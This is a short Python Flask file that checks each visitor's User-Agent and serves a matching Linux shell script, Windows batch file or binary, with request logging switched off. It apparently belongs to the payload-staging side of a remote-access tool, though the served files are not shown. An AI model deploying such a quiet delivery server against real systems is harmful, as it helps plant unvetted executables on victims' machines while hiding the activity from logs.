import os
import logging
import threading
from flask import Flask, request, send_from_directory

www = Flask(__name__)
logOutput = logging.getLogger('werkzeug')
logOutput.disabled = True

@www.route('/', methods=['GET','POST'])
def main():

	osHeader = request.headers.get('User-Agent')

	if ( "Linux" in osHeader ):
		downloadFilePath = os.path.join(www.root_path, "../../bin/Linux/")
		return send_from_directory(downloadFilePath, "Linux.sh")

	elif ( "Windows" in osHeader ):
		downloadFilePath = os.path.join(www.root_path, "../../bin/Windows/")
		return send_from_directory(downloadFilePath, "Windows.bat")

	else:
		return "False"

@www.route('/downloads', methods=['GET','POST'])
def downloads():
	
	osHeader = request.headers.get('User-Agent')

	if ( "Linux" in osHeader ):
		downloadFilePath = os.path.join(www.root_path, "../../bin/Linux/")
		return send_from_directory(downloadFilePath, "Linux")

	elif ( "Windows" in osHeader ):
		downloadFilePath = os.path.join(www.root_path, "../../bin/Windows/")
		return send_from_directory(downloadFilePath, "Windows")

	else:
		return "False"

def serveWebPage(WHOST, WPORT): www.run(host=WHOST, port=WPORT)
def serverWebPageThreaded(WHOST, WPORT): threading.Thread(target=serveWebPage, args=(WHOST,WPORT)).start()

